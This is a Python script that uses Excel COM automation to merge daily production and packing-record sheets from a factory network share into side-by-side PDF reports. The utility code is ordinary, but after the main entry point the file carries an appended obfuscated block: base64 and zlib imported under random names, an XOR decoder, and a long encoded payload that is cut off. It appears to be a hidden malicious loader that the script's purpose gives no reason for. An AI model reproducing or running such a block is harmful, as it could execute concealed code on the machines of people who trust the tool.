import win32com.client
import os
import sys
from datetime import datetime, timedelta
import pythoncom
import glob
import tkinter as tk
from tkinter import messagebox, simpledialog
import fitz  # PyMuPDF
import tempfile
import traceback
import time
import configparser
import shutil

# 事前バインディングを使用するため、gen_py削除処理は除去


# 設定ファイルのデフォルト値
DEFAULT_CONFIG = {
    'Paths': {
        'daily_path_template': r"\\133.134.25.112\d1_製造\05_操業\06_操業管理\05_操業_班責日誌\06_成形品ﾗｲﾝ梱包記録\{year}年\{month}月",
        'monthly_path_template': r"\\133.134.25.112\d1_製造\05_操業\06_操業管理\05_操業_班責日誌\01_班責日誌\02_成形品\02_ｴｸｾﾙﾃﾞｰﾀ\成形品班責日誌　{year}.{month:02d}",
        'output_base_dir': r"\\133.134.25.112\d1_製造\04_業務報告資料\14_技術室日報\成形品製造日誌PDF"
    }
}

def get_config_path():
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        try:
            base_dir = os.path.dirname(os.path.abspath(__file__))
        except NameError:
            base_dir = os.path.abspath(os.getcwd())
    return os.path.join(base_dir, 'config.ini')

def load_config():
    config = configparser.ConfigParser()
    config_path = get_config_path()
    
    if os.path.exists(config_path):
        try:
            config.read(config_path, encoding='utf-8')
            # 必要なキーがあるか確認、なければデフォルトを使用
            if not config.has_section('Paths'):
                config.add_section('Paths')
            for key, value in DEFAULT_CONFIG['Paths'].items():
                if not config.has_option('Paths', key):
                    config.set('Paths', key, value)
        except Exception as e:
            print(f"設定ファイルの読み込みに失敗しました: {e}")
            return DEFAULT_CONFIG
    else:
        # ファイルがない場合はデフォルトを返す（保存はエラー時またはユーザー要求時のみ）
        return DEFAULT_CONFIG
    
    # ConfigParserオブジェクトを辞書ライクに変換して返す
    return {'Paths': dict(config['Paths'])}

def save_config(current_config=None):
    config = configparser.ConfigParser()
    if current_config:
        for section, options in current_config.items():
            config[section] = options
    else:
        # デフォルト値を保存
        for section, options in DEFAULT_CONFIG.items():
            config[section] = options
            
    config_path = get_config_path()
    try:
        with open(config_path, 'w', encoding='utf-8') as f:
            config.write(f)
        return True
    except Exception as e:
        print(f"設定ファイルの保存に失敗しました: {e}")
        return False

def show_path_error_dialog(path_description, current_path):
    root = tk.Tk()
    root.withdraw()
    msg = f"{path_description}が見つかりません。\n\n検索パス:\n{current_path}\n\nフォルダ構成が変更された可能性があります。\n設定ファイル(config.ini)を作成/開いてパスを修正しますか？"
    if messagebox.askyesno("パスエラー", msg):
        # config.ini がなければ作成
        if not os.path.exists(get_config_path()):
            save_config()
        # 関連付けられたエディタで開く
        try:
            os.startfile(get_config_path())
        except Exception as e:
            messagebox.showerror("エラー", f"設定ファイルを開けませんでした: {e}")
    root.destroy()

def find_latest_file(directory, pattern):
    """
    指定されたディレクトリから最新のファイルを検索
    ## 変更点: ワイルドカードがない場合は glob を使わず高速化
    """
    search_path = os.path.join(directory, pattern)
    
    # ワイルドカードが含まれていない場合、globを使わずに直接存在確認
    if not any(c in pattern for c in "*?[]"):
        if os.path.exists(search_path):
            return search_path
        else:
            return None
            
    # ワイルドカードが含まれている場合、従来通りglobで最新を検索
    files = glob.glob(search_path)
    
    if not files:
        return None
    
    # 更新日時でソートして最新を取得
    latest_file = max(files, key=os.path.getmtime)
    return latest_file

## 変更点: 引数に path_daily と output_dir を追加
def create_combined_pdf(excel, wb_monthly_data, target_day, year, month, path_daily, output_dir):
    """
    指定された日付に対応する2つのシートを横に並べて1枚のPDFとして出力
    Excelインスタンスと月間データブックは引数で受け取る
    """
    
    ## 変更点: COM初期化は main で行うため削除
    ## 変更点: パス定義と出力先ディレクトリ作成は main で行うため削除
    
    wb_daily = None  # finally で閉じるために定義

    try:
        # 1. 成形品ライン梱包記録 (wb_monthly_data) は引数で受け取る
        #    シート検索のみここで行う
        
        sheet_name_monthly_data = str(target_day)
        monthly_data_sheet = None
        
        # Sheetsの列挙を安全に行う
        try:
            # 高速化: 直接名前で指定
            monthly_data_sheet = wb_monthly_data.Sheets(sheet_name_monthly_data)
        except Exception as e:
            print(f"シート検索エラー: {e}")
            traceback.print_exc()
            return None
        
        if not monthly_data_sheet:
            print(f"エラー: {os.path.basename(wb_monthly_data.FullName)} にシート '{sheet_name_monthly_data}' が見つかりません")
            # 利用可能なシート名を安全に取得
            available_sheets = []
            try:
                for i in range(1, wb_monthly_data.Sheets.Count + 1):
                    available_sheets.append(wb_monthly_data.Sheets(i).Name)
            except:
                pass
            print(f"利用可能なシート: {available_sheets}")
            return None
        
        # 2. 月間集計(製造実績)の最新ファイルを検索
        print(f"月間集計(製造実績)を検索中: {path_daily}")
        pattern_daily = f"{year}{month:02d}{target_day:02d}_月間集計(製造実績).xlsm"
        daily_file = find_latest_file(path_daily, pattern_daily)
        
        if not daily_file:
            # .xlsxも試す
            pattern_daily = f"{year}{month:02d}{target_day:02d}_月間集計(製造実績).xlsx"
            daily_file = find_latest_file(path_daily, pattern_daily)
        
        if not daily_file:
            print(f"エラー: 月間集計(製造実績)が見つかりません(パターン: {pattern_daily})")
            print(f"検索パス: {path_daily}")
            ## 変更点: wb_monthly_data は main で閉じるのでここでは閉じない
            return None
            
        print(f"  見つかりました: {os.path.basename(daily_file)}")
        
        # ネットワークファイルを一時ディレクトリにコピー
        temp_daily_file = os.path.join(tempfile.gettempdir(), f"temp_daily_{year}{month:02d}{target_day:02d}.xlsm")
        print(f"  ファイルをローカルにコピー中...")
        shutil.copy2(daily_file, temp_daily_file)
        
        # 最小限のパラメータでファイルを開く（位置引数）
        wb_daily = excel.Workbooks.Open(
            temp_daily_file,
            0,  # UpdateLinks
            False  # ReadOnly=False
        )
        
        # シート名は「数値+日」の形式を探す。見つからない場合は「集計」シートを使用
        sheet_name_daily = f"{target_day}日"
        daily_sheet = None
        try:
            # 高速化: 直接名前で指定
            daily_sheet = wb_daily.Sheets(sheet_name_daily)
        except Exception as e:
            print(f"シート検索エラー: {e}")
            traceback.print_exc()
            return None
        
        # 「X日」形式のシートが見つからない場合、「集計」シートを使用
        if not daily_sheet:
            try:
                # 高速化: 直接名前で指定
                daily_sheet = wb_daily.Sheets("集計")
                print(f"  注意: '{sheet_name_daily}'シートが見つからないため、'集計'シートを使用します")
            except Exception as e:
                print(f"シート検索エラー: {e}")
                traceback.print_exc()
                return None

        # (デバッグ用プリント文は元のまま)
        print(f"右側シート名: {monthly_data_sheet.Name}")
        print(f"右側シートのA1セル: {monthly_data_sheet.Range('A1').Value}")
        print(f"右側シートのA2セル: {monthly_data_sheet.Range('A2').Value}")
        print(f"右側シートのB1セル: {monthly_data_sheet.Range('B1').Value}")
        print(f"右側シートのUsedRangeアドレス: {monthly_data_sheet.UsedRange.Address}")
        print(f"右側シートの可視性: {monthly_data_sheet.Visible}")

        if not daily_sheet:
            print(f"エラー: {os.path.basename(daily_file)} にシート '{sheet_name_daily}' が見つかりません")
            # 利用可能なシート名を安全に取得
            available_sheets = []
            try:
                for i in range(1, wb_daily.Sheets.Count + 1):
                    available_sheets.append(wb_daily.Sheets(i).Name)
            except:
                pass
            print(f"利用可能なシート: {available_sheets}")
            ## 変更点: wb_daily は finally で閉じる
            return None
        
        print(f"\n{target_day}日のシートを処理中...")
        print(f"  - 月間集計: {os.path.basename(daily_file)} のシート '{sheet_name_daily}'")
        print(f"  - データ: {os.path.basename(wb_monthly_data.FullName)} のシート '{sheet_name_monthly_data}'")

        # 一時PDFファイルのパス
        temp_dir = tempfile.gettempdir()
        temp_pdf_left = os.path.join(temp_dir, f"temp_left_{target_day}_{int(time.time())}.pdf")
        temp_pdf_right = os.path.join(temp_dir, f"temp_right_{target_day}_{int(time.time())}.pdf")
        
        # 左側(月間集計)のページ設定を統一
        print("左側(月間集計)のページ設定中...")
        
        # 最適化: PrintCommunicationをオフにする
        excel.PrintCommunication = False
        try:
            print_area = daily_sheet.PageSetup.PrintArea
            if not print_area:
                used_range = daily_sheet.UsedRange
                daily_sheet.PageSetup.PrintArea = used_range.Address
                print(f"  印刷範囲を設定: {used_range.Address}")
            else:
                print(f"  既存の印刷範囲: {print_area}")
            
            ps = daily_sheet.PageSetup
            ps.PaperSize = 9
            ps.Orientation = 1
            ps.Zoom = 100
            ps.LeftMargin = excel.InchesToPoints(0.2)
            ps.RightMargin = excel.InchesToPoints(0.2)
            ps.TopMargin = excel.InchesToPoints(0.2)
            ps.BottomMargin = excel.InchesToPoints(0.2)
            ps.HeaderMargin = excel.InchesToPoints(0.3)
            ps.FooterMargin = excel.InchesToPoints(0.3)
            ps.Zoom = False
            ps.FitToPagesWide = 1
            ps.FitToPagesTall = 1
        finally:
            excel.PrintCommunication = True
        
        # 左側(月間集計)をPDF化
        print("左側(月間集計)をPDF化中...")
        wb_daily.Activate()
        daily_sheet.Activate()
        daily_sheet.ExportAsFixedFormat(
            Type=0, Filename=temp_pdf_left, Quality=0,
            IncludeDocProperties=True, IgnorePrintAreas=False, OpenAfterPublish=False
        )
        
        # 右側(データ)のページ設定を統一
        print("右側(データ)のページ設定中...")
        
        # 最適化: PrintCommunicationをオフにする
        excel.PrintCommunication = False
        try:
            print_area = monthly_data_sheet.PageSetup.PrintArea
            if not print_area:
                used_range = monthly_data_sheet.UsedRange
                monthly_data_sheet.PageSetup.PrintArea = used_range.Address
                print(f"  印刷範囲を設定: {used_range.Address}")
            else:
                print(f"  既存の印刷範囲: {print_area}")
            
            ps = monthly_data_sheet.PageSetup
            ps.PaperSize = 9
            ps.Orientation = 1
            ps.Zoom = 100
            ps.LeftMargin = excel.InchesToPoints(0.2)
            ps.RightMargin = excel.InchesToPoints(0.2)
            ps.TopMargin = excel.InchesToPoints(0.2)
            ps.BottomMargin = excel.InchesToPoints(0.2)
            ps.HeaderMargin = excel.InchesToPoints(0.3)
            ps.FooterMargin = excel.InchesToPoints(0.3)
            ps.Zoom = False
            ps.FitToPagesWide = 1
            ps.FitToPagesTall = 1
        finally:
            excel.PrintCommunication = True
        
        # 右側(データ)をPDF化
        print("右側(データ)をPDF化中...")
        wb_monthly_data.Activate()
        monthly_data_sheet.Activate()
        monthly_data_sheet.ExportAsFixedFormat(
            Type=0, Filename=temp_pdf_right, Quality=0,
            IncludeDocProperties=True, IgnorePrintAreas=False, OpenAfterPublish=False
        )
        
        ## 変更点: Excelファイルは main で閉じるため、ここでは wb_daily のみ閉じる (finally句に移動)
        
        # 2つのPDFを横に並べて結合(PyMuPDFを使用)
        print("PDFを結合中...")
        
        output_pdf = os.path.join(output_dir, f"{year}{month:02d}{target_day:02d}_製造実績.pdf")
        
        if os.path.exists(output_pdf):
            try:
                os.remove(output_pdf)
            except:
                output_pdf = os.path.join(output_dir, f"{year}{month:02d}{target_day:02d}_製造実績_{int(time.time())}.pdf")
                print(f"既存ファイルが開かれているため、別名で保存: {os.path.basename(output_pdf)}")
        
        pdf_left = None
        pdf_right = None
        pdf_left_normalized = None
        pdf_right_normalized = None
        pdf_output = None
        
        try:
            # (PDF結合処理は元のまま)
            pdf_left = fitz.open(temp_pdf_left)
            pdf_right = fitz.open(temp_pdf_right)
            
            page_left = pdf_left[0]
            page_right = pdf_right[0]
            
            left_width = page_left.rect.width
            left_height = page_left.rect.height
            right_width = page_right.rect.width
            right_height = page_right.rect.height
            print(f"左側PDFサイズ(元): {left_width} x {left_height}")
            print(f"右側PDFサイズ(元): {right_width} x {right_height}")
            
            target_pdf_width = 595
            target_pdf_height = 842
            
            pdf_left_normalized = fitz.open()
            page_left_normalized = pdf_left_normalized.new_page(width=target_pdf_width, height=target_pdf_height)
            scale_left = min(target_pdf_width / left_width, target_pdf_height / left_height)
            scaled_left_width = left_width * scale_left
            scaled_left_height = left_height * scale_left
            x_offset_left = (target_pdf_width - scaled_left_width) / 2
            y_offset_left = (target_pdf_height - scaled_left_height) / 2
            rect_left_norm = fitz.Rect(x_offset_left, y_offset_left, 
                                       x_offset_left + scaled_left_width, 
                                       y_offset_left + scaled_left_height)
            page_left_normalized.show_pdf_page(rect_left_norm, pdf_left, 0)
            print(f"左側PDFサイズ(正規化後): {target_pdf_width} x {target_pdf_height}")
            
            pdf_right_normalized = fitz.open()
            page_right_normalized = pdf_right_normalized.new_page(width=target_pdf_width, height=target_pdf_height)
            scale_right = min(target_pdf_width / right_width, target_pdf_height / right_height)
            scaled_right_width = right_width * scale_right
            scaled_right_height = right_height * scale_right
            x_offset_right = (target_pdf_width - scaled_right_width) / 2
            y_offset_right = (target_pdf_height - scaled_right_height) / 2
            rect_right_norm = fitz.Rect(x_offset_right, y_offset_right, 
                                        x_offset_right + scaled_right_width, 
                                        y_offset_right + scaled_right_height)
            page_right_normalized.show_pdf_page(rect_right_norm, pdf_right, 0)
            print(f"右側PDFサイズ(正規化後): {target_pdf_width} x {target_pdf_height}")
            
            pdf_output = fitz.open()
            page_output = pdf_output.new_page(width=842, height=595)
            
            half_width = 842 / 2
            full_height = 595
            
            target_aspect = target_pdf_width / target_pdf_height
            display_h = full_height
            display_w = full_height * target_aspect
            
            if display_w > half_width:
                display_w = half_width
                display_h = half_width / target_aspect
            
            left_x = 0
            left_y = 0
            rect_left = fitz.Rect(left_x, left_y, left_x + display_w, left_y + display_h)
            page_output.show_pdf_page(rect_left, pdf_left_normalized, 0)
            
            right_x = half_width
            right_y = 0
            rect_right = fitz.Rect(right_x, right_y, right_x + display_w, right_y + display_h)
            page_output.show_pdf_page(rect_right, pdf_right_normalized, 0)
            
            print(f"左側配置: {display_w:.1f} x {display_h:.1f} at ({left_x:.1f}, {left_y:.1f})")
            print(f"右側配置: {display_w:.1f} x {display_h:.1f} at ({right_x:.1f}, {right_y:.1f})")
            
            pdf_output.save(output_pdf)
            print(f"結合成功")
            
        except Exception as e:
            print(f"PDF結合エラー: {e}")
            traceback.print_exc()
            print(f"左側PDF: {temp_pdf_left}")
            print(f"右側PDF: {temp_pdf_right}")
            return None
        finally:
            # PDFオブジェクトを閉じる
            if pdf_left: pdf_left.close()
            if pdf_right: pdf_right.close()
            if pdf_left_normalized: pdf_left_normalized.close()
            if pdf_right_normalized: pdf_right_normalized.close()
            if pdf_output: pdf_output.close()

        # 一時ファイルを削除
        try:
            if os.path.exists(temp_pdf_left):
                os.remove(temp_pdf_left)
            if os.path.exists(temp_pdf_right):
                os.remove(temp_pdf_right)
        except:
            print(f"警告: 一時ファイルの削除に失敗しました")
            pass
        
        print(f"\nPDFを作成しました: {output_pdf}")
        
        return output_pdf

    except Exception as e:
        print(f"エラーが発生しました: {e}")
        traceback.print_exc()
        return None
    
    finally:
        # クリーンアップ
        ## 変更点: wb_daily のみここで閉じる
        try:
            if wb_daily:
                wb_daily.Close(SaveChanges=False)
        except Exception as e:
            # エラーは無視して続行
            print(f"  警告: wb_dailyのクローズ中にエラー: {e}")
            pass
        ## 変更点: Excel終了とCOM解放は main で行うため削除

def parse_day_range(day_str):
    # (変更なし)
    days = set()
    parts = day_str.split(',')
    
    for part in parts:
        part = part.strip()
        if '-' in part:
            try:
                start, end = part.split('-')
                start = int(start.strip())
                end = int(end.strip())
                if start < 1 or end > 31 or start > end:
                    print(f"警告: 無効な範囲 '{part}'、スキップします")
                    continue
                days.update(range(start, end + 1))
            except ValueError:
                print(f"警告: 無効な範囲 '{part}'、スキップします")
        else:
            try:
                day = int(part)
                if day < 1 or day > 31:
                    print(f"警告: 無効な日付 '{part}'、スキップします")
                    continue
                days.add(day)
            except ValueError:
                print(f"警告: 無効な日付 '{part}'、スキップします")
    
    return sorted(list(days))

def get_missing_days(base_dir, year, month, up_to_day):
    """
    指定された月のフォルダ内で欠けている日付を検出
    up_to_day: この日付まで(含まない)のPDFが必要
    """
    folder_name = f"{year}{month:02d}_成形日誌"
    folder_path = os.path.join(base_dir, folder_name)
    
    missing_days = []
    
    # フォルダが存在しない場合は、1日から前日まで全て必要
    if not os.path.exists(folder_path):
        # 対象月の最終日を取得
        if month == 12:
            next_month = datetime(year + 1, 1, 1)
        else:
            next_month = datetime(year, month + 1, 1)
        last_day_of_month = (next_month - timedelta(days=1)).day
        
        # 1日からup_to_day-1まで、または月末まで
        for day in range(1, min(up_to_day, last_day_of_month + 1)):
            missing_days.append(day)
        return missing_days
    
    # フォルダが存在する場合、既存のPDFをチェック
    existing_pdfs = set()
    for filename in os.listdir(folder_path):
        if filename.endswith('_製造実績.pdf') and not filename.endswith(f'_{int(time.time())}.pdf'):
            # ファイル名から日付を抽出 (例: 20251101_製造実績.pdf)
            try:
                date_str = filename[:8]  # YYYYMMDD
                file_year = int(date_str[:4])
                file_month = int(date_str[4:6])
                file_day = int(date_str[6:8])
                
                if file_year == year and file_month == month:
                    existing_pdfs.add(file_day)
            except:
                continue
    
    # 対象月の最終日を取得
    if month == 12:
        next_month = datetime(year + 1, 1, 1)
    else:
        next_month = datetime(year, month + 1, 1)
    last_day_of_month = (next_month - timedelta(days=1)).day
    
    # 1日からup_to_day-1まで、または月末までで欠けている日付を抽出
    for day in range(1, min(up_to_day, last_day_of_month + 1)):
        if day not in existing_pdfs:
            missing_days.append(day)
    
    return sorted(missing_days)

def main():
    # 今日の日付から年月日を取得
    today = datetime.now()
    
    # 設定読み込み
    config = load_config()
    daily_path_template = config['Paths']['daily_path_template']
    monthly_path_template = config['Paths']['monthly_path_template']
    
    # 前日の日付を計算
    yesterday = today - timedelta(days=1)
    default_year = yesterday.year
    default_month = yesterday.month
    default_day = yesterday.day
    
    target_days = []
    auto_mode = False  # 自動補完モードかどうか
    
    # コマンドライン引数またはGUIで日付を取得
    if len(sys.argv) > 1:
        day_arg = sys.argv[1]
        if day_arg.lower() == 'auto':
            # 自動補完モード
            auto_mode = True
            year = default_year
            month = default_month
        elif ',' in day_arg or '-' in day_arg:
            target_days = parse_day_range(day_arg)
            if not target_days:
                print("有効な日付が指定されていません")
                return
        else:
            try:
                target_day = int(day_arg)
                if target_day < 1 or target_day > 31:
                    print("日付は1-31の範囲で指定してください")
                    return
                target_days = [target_day]
            except ValueError:
                print("数値を入力してください")
                return
                
        # 年月の指定(コマンドライン引数)
        if len(sys.argv) > 2:
            try:
                year = int(sys.argv[2])
            except ValueError:
                print(f"警告: 無効な年 '{sys.argv[2]}'、デフォルト({default_year})を使用します")
                year = default_year
        else:
            year = default_year
        
        if len(sys.argv) > 3:
            try:
                month = int(sys.argv[3])
                if month < 1 or month > 12:
                    print(f"警告: 無効な月 '{sys.argv[3]}'、デフォルト({default_month})を使用します")
                    month = default_month
            except ValueError:
                print(f"警告: 無効な月 '{sys.argv[3]}'、デフォルト({default_month})を使用します")
                month = default_month
        else:
            month = default_month
    else:
        # GUI起動時は自動的に欠けている日付を検出（確認ダイアログなし）
        auto_mode = True
        year = default_year
        month = default_month
        
        # 出力先ベースディレクトリを取得
        if getattr(sys, 'frozen', False):
            base_dir = os.path.dirname(sys.executable)
        else:
            try:
                base_dir = os.path.dirname(os.path.abspath(__file__))
            except NameError:
                base_dir = os.path.abspath(os.getcwd())
        
        # 欠けている日付を検出（前日の翌日=今日の日付まで）
        # 前日の年月で、前日の翌日(=今日)までチェック
        # 例: 今日が12/1なら、11月で12/1(32日目相当)までチェック→11月末までチェック
        missing_days = get_missing_days(base_dir, year, month, default_day + 1)
        
        if not missing_days:
            # 全て生成済みの場合は何もせずに終了（タスクスケジュール対応）
            print(f"前日({year}年{month}月{default_day}日)までのPDFは全て生成済みです。")
            return
        else:
            # 欠けている日付がある場合は自動的に生成（確認なし）
            target_days = missing_days
            print(f"欠けているPDFを自動生成します: {', '.join(map(str, missing_days))}日")

    # 処理対象の日付がない場合は終了
    if not target_days:
        print("処理対象の日付がありません。")
        return

    ## 変更点: COM初期化を main の先頭に移動
    print("COMを初期化しています...")
    pythoncom.CoInitialize()
    
    excel = None
    wb_monthly_data = None
    
    try:
        ## 変更点: Excelインスタンスを一度だけ起動
        print("Excelを起動中...")
        # 事前バインディングを使用（EnsureDispatch）
        excel = win32com.client.gencache.EnsureDispatch("Excel.Application")
        # 自動計算を停止（高速化）
        excel.Calculation = -4135  # xlCalculationManual
        excel.Visible = False  # Excelを非表示に
        excel.DisplayAlerts = False  # すべてのアラートを無効化
        excel.AskToUpdateLinks = False  # 外部リンク更新の確認を無効化
        excel.AlertBeforeOverwriting = False  # 上書き警告を無効化
        excel.ScreenUpdating = False  # 画面更新を無効化
        excel.AutomationSecurity = 3  # マクロを無効化
        excel.FeatureInstall = 0  # 機能のインストールプロンプトを表示しない
        
        ## 変更点: 月間データファイルを一度だけ検索して開く
        # パス定義 (設定ファイルから)
        path_daily = daily_path_template.format(year=year, month=month)
        path_monthly_data = monthly_path_template.format(year=year, month=month)
        
        # 出力先ディレクトリの計算
        if getattr(sys, 'frozen', False):
            base_dir = os.path.dirname(sys.executable)
        else:
            try:
                base_dir = os.path.dirname(os.path.abspath(__file__))
            except NameError:
                base_dir = os.path.abspath(os.getcwd())
                
        folder_name = f"{year}{month:02d}_成形日誌"
        output_dir = os.path.join(base_dir, folder_name)
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        print(f"\n処理対象: {year}年{month}月")
        if auto_mode:
            print(f"モード: 自動補完")
        print(f"対象日: {', '.join(map(str, target_days))}")
        
        print(f"\n成形品ライン梱包記録(月間)を検索中: {path_monthly_data}")
        
        # フォルダ自体の存在確認
        if not os.path.exists(path_monthly_data):
             show_path_error_dialog("月間データフォルダ", path_monthly_data)
             return
             
        if not os.path.exists(path_daily):
             show_path_error_dialog("日次データフォルダ", path_daily)
             return

        # ファイル名パターン: 2026.02.01～2026.02.28.xlsx
        pattern_monthly = f"{year}.{month:02d}.01～*.xlsx"
        monthly_data_file = find_latest_file(path_monthly_data, pattern_monthly)
        
        if not monthly_data_file:
            pattern_monthly = f"{year}.{month:02d}.01～*.xlsm"
            monthly_data_file = find_latest_file(path_monthly_data, pattern_monthly)
        
        if not monthly_data_file:
            show_path_error_dialog(f"成形品ライン梱包記録(パターン: {pattern_monthly})", path_monthly_data)
            return # finally が実行される

        print(f"  見つかりました: {os.path.basename(monthly_data_file)}")
        
        # ネットワークファイルを一時ディレクトリにコピー
        import shutil
        temp_monthly_file = os.path.join(tempfile.gettempdir(), f"temp_monthly_{year}{month:02d}.xlsx")
        print(f"  ファイルをローカルにコピー中...")
        shutil.copy2(monthly_data_file, temp_monthly_file)
        print(f"  コピー完了。ファイルを開き、計算を実行しています...")
        
        # 最小限のパラメータでファイルを開く（位置引数）
        wb_monthly_data = excel.Workbooks.Open(
            temp_monthly_file,
            0,  # UpdateLinks
            False  # ReadOnly=Falseに変更（ローカルファイルなので）
        )
        wb_monthly_data.Application.Calculate() # 一度だけ計算
        print("  計算完了。")

        # 複数日付の処理
        print(f"\n{len(target_days)}日分のPDFを生成します")
        
        success_count = 0
        failed_days = []
        created_pdfs = []
        
        for i, target_day in enumerate(target_days, 1):
            print(f"\n{'='*60}")
            print(f"[{i}/{len(target_days)}] {year}年{month}月{target_day}日を処理中...")
            print(f"{'='*60}")
            
            ## 変更点: excel と wb_monthly_data とパス情報を渡す
            result = create_combined_pdf(excel, wb_monthly_data, target_day, year, month, path_daily, output_dir)
            
            if result:
                success_count += 1
                created_pdfs.append(result)
            else:
                failed_days.append(target_day)
        
        # 結果サマリー

        # (変更なし)
        print(f"\n{'='*60}")
        print(f"処理完了")
        print(f"{'='*60}")
        print(f"成功: {success_count}/{len(target_days)}")
        if failed_days:
            print(f"失敗: {', '.join(map(str, failed_days))}日")
        
        # 作成されたPDFを表示
        if created_pdfs:
            print(f"\n作成されたPDF:")
            for pdf_path in created_pdfs:
                print(f"  {os.path.basename(pdf_path)}")
            
            # タスクスケジュール対応: ダイアログ表示なし
            print(f"\n処理完了: {success_count}/{len(target_days)}件のPDFを生成しました")
            if failed_days:
                print(f"失敗した日付: {', '.join(map(str, failed_days))}日")
        else:
            print(f"\nエラー: PDFの作成に失敗しました")
            if failed_days:
                print(f"失敗した日付: {', '.join(map(str, failed_days))}日")

    ## 変更点: クリーンアップ処理を finally に集約
    finally:
        print("\nクリーンアップ処理を実行中...")
        try:
            if wb_monthly_data:
                print("  月間データファイルを閉じています...")
                wb_monthly_data.Close(SaveChanges=False)
            if excel:
                print("  Excelプロセスを終了しています...")
                excel.DisplayAlerts = False
                excel.Quit()
            excel = None
            wb_monthly_data = None
        except Exception as e:
            print(f"  クリーンアップ中にエラーが発生しました: {e}")
            pass
        
        print("  COMを解放しています...")
        pythoncom.CoUninitialize()
        print("処理が完全に終了しました。")


if __name__ == "__main__":
    main()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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